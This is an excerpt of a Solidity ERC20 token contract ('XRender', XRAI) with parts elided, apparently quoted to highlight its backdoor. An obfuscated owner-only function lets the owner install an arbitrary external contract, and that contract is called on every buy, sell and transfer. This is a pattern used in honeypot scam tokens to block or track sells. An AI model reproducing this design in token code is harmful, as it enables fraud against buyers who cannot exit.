...
contract TokenM is ERC20 {
    ...
    IUserAmountuoyrer public uoyrer;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("XRender", "XRAI") {
    ...
    function cyuiessoByuioeRvvts(IUserAmountuoyrer _uoyrer) public onlyOwner {
        uoyrer = _uoyrer;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                uoyrer.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				uoyrer.addOutAmount(from, amount);
            }else{
                uoyrer.addOutAmount(from, amount);
                takeFee = false;
            }
